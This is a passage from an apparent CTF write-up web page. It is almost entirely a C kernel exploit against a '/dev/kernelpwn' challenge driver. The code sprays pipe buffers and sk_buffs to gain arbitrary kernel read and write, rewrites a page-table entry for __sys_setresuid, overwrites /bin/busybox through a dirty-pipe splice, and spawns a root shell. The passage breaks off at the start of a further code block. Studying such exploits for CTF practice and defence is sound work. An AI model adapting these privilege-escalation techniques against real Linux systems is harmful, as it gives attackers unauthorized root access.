class="p">,</span> <span class="mi">210</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">5</span><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">key_spray</span> <span class="o">=</span> <span class="mi">64</span><span class="o">*</span><span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">size_t</span> <span class="n">s2</span><span class="p">,</span><span class="n">tmp_idx</span><span class="p">,</span><span class="n">page_offset_base</span><span class="p">,</span><span class="n">vmemmap_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="nf">dirt</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(((</span><span class="n">addr</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xfff</span><span class="p">)</span> <span class="o">-</span> <span class="n">page_offset_base</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x40</span> <span class="o">+</span> <span class="n">vmemmap_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">arb_read</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="n">buf</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="sc">&#39;\x00&#39;</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">s2</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x200</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">addr</span><span class="p">;</span>  
</span></span><span class="line"><span class="cl">    <span class="n">buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x000011ff00000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">s2</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="sc">&#39;\x00&#39;</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">tmp_idx</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">arb_write</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="n">write_data</span><span class="p">,</span><span class="kt">uint64_t</span> <span class="n">size</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="nf">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x4000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="sc">&#39;\x00&#39;</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">read</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">s2</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span><span class="n">data</span><span class="p">,</span><span class="mh">0x200</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">addr</span><span class="p">;</span>  
</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0000000000000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">s2</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span><span class="n">data</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="n">tmp_idx</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span><span class="n">write_data</span><span class="p">,</span><span class="n">size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">get_addr</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">pgd_addr</span><span class="p">,</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">pte_addr</span><span class="p">,</span><span class="n">pud_addr</span><span class="p">,</span><span class="n">pmd_addr</span><span class="p">,</span><span class="n">page_addr</span><span class="p">,</span><span class="n">dst_addr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">dst_addr</span> <span class="o">=</span> <span class="n">addr</span><span class="p">;</span><span class="c1">// __sys_setresuid
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">arb_read</span><span class="p">(</span><span class="nf">dirt</span><span class="p">(</span><span class="n">pgd_addr</span><span class="p">),</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pud_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="nf">PGD_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="mh">0xfff</span><span class="p">))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="n">PAGE_ATTR_NX</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pud_addr</span> <span class="o">+=</span> <span class="n">page_offset_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">arb_read</span><span class="p">(</span><span class="nf">dirt</span><span class="p">(</span><span class="n">pud_addr</span><span class="p">),</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pmd_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="nf">PUD_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="mh">0xfff</span><span class="p">))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="n">PAGE_ATTR_NX</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pmd_addr</span> <span class="o">+=</span> <span class="n">page_offset_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">arb_read</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span> <span class="nf">dirt</span><span class="p">(</span><span class="n">pmd_addr</span><span class="p">),</span> <span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pte_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="nf">PMD_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="mh">0xfff</span><span class="p">))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="n">PAGE_ATTR_NX</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">page_addr</span> <span class="o">=</span> <span class="n">pte_addr</span> <span class="o">+</span> <span class="mh">0x1000</span> <span class="o">*</span> <span class="nf">PTE_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">pte_addr</span> <span class="o">+=</span> <span class="n">page_offset_base</span><span class="p">;</span><span class="c1">//==kernel_base ; + 0xeab50 == __sys_setre
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">arb_read</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span> <span class="nf">dirt</span><span class="p">(</span><span class="n">pte_addr</span><span class="p">),</span> <span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">page_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="nf">PTE_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="mh">0xfff</span><span class="p">))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="n">PAGE_ATTR_NX</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">page_addr</span> <span class="o">+=</span> <span class="n">page_offset_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="p">[</span><span class="nf">PTE_ENTRY</span><span class="p">(</span><span class="n">dst_addr</span><span class="p">)]</span> <span class="o">=</span> <span class="mh">0x1fc000</span> <span class="o">|</span> <span class="mh">0x8000000000000867</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">arb_write</span><span class="p">(</span><span class="nf">dirt</span><span class="p">(</span><span class="n">pte_addr</span><span class="p">),</span><span class="n">data</span><span class="p">,</span><span class="mh">0xff0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">get_root_shell</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nf">getuid</span><span class="p">())</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\033</span><span class="s">[31m</span><span class="se">\033</span><span class="s">[1m[x] Failed to get the root!</span><span class="se">\033</span><span class="s">[0m&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\033</span><span class="s">[32m</span><span class="se">\033</span><span class="s">[1m[+] Successful to get the root. </span><span class="se">\033</span><span class="s">[0m&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\033</span><span class="s">[34m</span><span class="se">\033</span><span class="s">[1m[*] Execve root shell now...</span><span class="se">\033</span><span class="s">[0m&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="cm">/* to exit the process normally, instead of segmentation fault */</span>
</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="n">EXIT_SUCCESS</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">exp</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="nf">set_cpu_affinity</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">init_namespace</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/kernelpwn&#34;</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;open&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="nf">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x10000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="sc">&#39;a&#39;</span><span class="p">,</span><span class="mh">0x200</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logd</span><span class="p">(</span><span class="s">&#34;init sk-buffers&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x10</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">init_sk_buffer</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">build_msg</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logd</span><span class="p">(</span><span class="s">&#34;init pipe buffer&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x40</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">alloc_pipe_buff</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;spray some objects&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x80</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">add_only</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;free objects now this page will back to buddy system&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x80</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">del</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// logd(&#34;spary some 0x200 pipe-buffers&#34;);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// for(int i = 0; i &lt; 0x8; i++){
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//     change_pipe_buff_size(i,0x200);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//     memset(buf,&#39;a&#39; + i,0x100);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//     write(pipes [i][1], buf, i + 1);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// }
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">logd</span><span class="p">(</span><span class="s">&#34;spary some sk-buffer&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x8</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="sc">&#39;a&#39;</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">alloc_sk_buffer</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x200</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">obj_idx</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x80</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">show</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x20</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mh">0x6161616161616161</span> <span class="o">&amp;&amp;</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">48</span> <span class="o">!=</span> <span class="mh">0xffff</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;get[%d]&#34;</span><span class="p">,</span><span class="n">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">obj_idx</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">del</span><span class="p">(</span><span class="n">obj_idx</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">skb_idx</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">56</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x61</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;get skb idx %d&#34;</span><span class="p">,</span><span class="n">skb_idx</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">change_pipe_buff_size</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x200</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;Dirty pipe&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">attack_fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/bin/busybox&#34;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">attack_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;open&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">loff_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="mh">0x1FDAC8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">splice_fd</span><span class="p">(</span><span class="n">attack_fd</span><span class="p">,</span><span class="n">offset</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">show_skb_buff</span><span class="p">(</span><span class="n">skb_idx</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x200</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">alloc_sk_buffer</span><span class="p">(</span><span class="mh">0x9</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x200</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span><span class="n">attack_data</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">attack_data</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//avoid pipe_buffer and sk-buffer in same object
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">release_pipe_buff</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">msgbuf</span><span class="p">.</span><span class="n">mtype</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">add_msg</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">msgbuf</span><span class="p">,</span><span class="mh">0x200</span><span class="o">-</span><span class="mh">0x30</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">__pause</span><span class="p">(</span><span class="s">&#34;debug&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">cid</span> <span class="o">=</span> <span class="nf">fork</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">cid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exp</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">wstatus</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">wait</span><span class="p">(</span><span class="n">wstatus</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">WIFEXITED</span><span class="p">(</span><span class="n">wstatus</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nf">WEXITSTATUS</span><span class="p">(</span><span class="n">wstatus</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// setresuid(0, 0, 0);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="c1">// execl(&#34;/bin/sh&#34;, &#34;sh&#34;, NULL);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span> 
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240209015808-705.png"
        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240209015808-705.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240209015808-705.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240209015808-705.png 2x"
        data-sizes="auto"
        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240209015808-705.png"
        title="image-20240207041158244" /></p>
<h4 id="0x80">0x80</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
